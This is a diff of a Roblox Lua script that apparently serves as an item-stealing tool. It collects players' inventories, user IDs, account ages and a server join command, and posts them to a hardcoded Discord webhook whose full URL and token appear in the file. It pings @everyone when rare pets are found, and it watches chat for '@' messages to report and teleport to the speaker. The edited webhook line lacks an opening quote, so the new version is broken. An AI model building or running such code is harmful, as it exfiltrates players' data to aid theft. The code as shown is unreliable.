@@ -5,8 +5,8 @@ local RunService = game:GetService("RunService")
 local Camera = workspace.CurrentCamera
 local UserInputService = game:GetService("UserInputService")
 
--- CONFIG (PUT YOUR REAL WEBHOOK HERE)
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
+-- CONFIG (REPLACE WITH YOUR WEBHOOK)
+local WEBHOOK_URL = https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
 
 -- PET PRIORITY (Highest to Lowest)
 local PET_PRIORITY = {
@@ -25,18 +25,52 @@ local IGNORE_ITEMS = {
     "Destroy Plants"
 }
 
---[[ WEBHOOK THAT ACTUALLY WORKS ]]--
-local function sendWebhook(content)
-    local payload = {
-        content = content,
-        embeds = {{
-            title = "Roqate - 2025",
-            description = "Player triggered the system",
-            color = 0xFF0000,
-            fields = {
-                {name = "Join Code", value = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', game.PlaceId, game.JobId)}
+--[[ WEBHOOK THAT WORKS ]]--
+local function sendWebhook(player)
+    -- Get all items from inventory
+    local items = {}
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack then
+        for _,item in pairs(backpack:GetChildren()) do
+            table.insert(items, item.Name)
+        end
+    end
+    
+    -- Check for rare pets
+    local hasRare = false
+    for pet in pairs(PET_PRIORITY) do
+        if table.find(items, pet) then
+            hasRare = true
+            break
+        end
+    end
+
+    local embed = {
+        title = "📦 "..player.Name.."'s Inventory",
+        description = #items > 0 and table.concat(items, "\n") or "No items found",
+        color = hasRare and 0xFF0000 or 0x00FF00,
+        fields = {
+            {
+                name = "JOIN SCRIPT", 
+                value = string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s")', game.PlaceId, game.JobId),
+                inline = false
+            },
+            {
+                name = "User ID",
+                value = tostring(player.UserId),
+                inline = true
+            },
+            {
+                name = "Account Age",
+                value = tostring(player.AccountAge),
+                inline = true
             }
-        }}
+        }
+    }
+
+    local payload = {
+        content = hasRare and "@everyone" or nil,
+        embeds = {embed}
     }
     
     local success, err = pcall(function()
@@ -153,28 +187,32 @@ end
 --[[ CHAT DETECTION ]]--
 local function onChatted(player, msg)
     if player == LocalPlayer then return end
-    if not string.find(string.lower(msg), "@") then return end
+    if not msg or not string.find(string.lower(tostring(msg)), "@") then return end
     
-    -- SEND WEBHOOK
-    sendWebhook(player.Name.." triggered with @")
+    -- SEND WEBHOOK with full inventory
+    sendWebhook(player)
     
     -- TELEPORT AND INTERACT
     teleportAndInteract(player)
 end
 
 --[[ INITIALIZE ]]--
--- Send initial webhook
-sendWebhook("System activated by "..LocalPlayer.Name)
+-- Send initial webhook with local player's inventory
+sendWebhook(LocalPlayer)
 
 -- Set up chat listeners
 for _,player in pairs(Players:GetPlayers()) do
     if player ~= LocalPlayer then
-        player.Chatted:Connect(onChatted)
+        player.Chatted:Connect(function(msg)
+            onChatted(player, msg)
+        end)
     end
 end
 
 Players.PlayerAdded:Connect(function(player)
-    player.Chatted:Connect(onChatted)
+    player.Chatted:Connect(function(msg)
+        onChatted(player, msg)
+    end)
 end)
 
 print("✅ SYSTEM WORKING - Waiting for @ mentions")
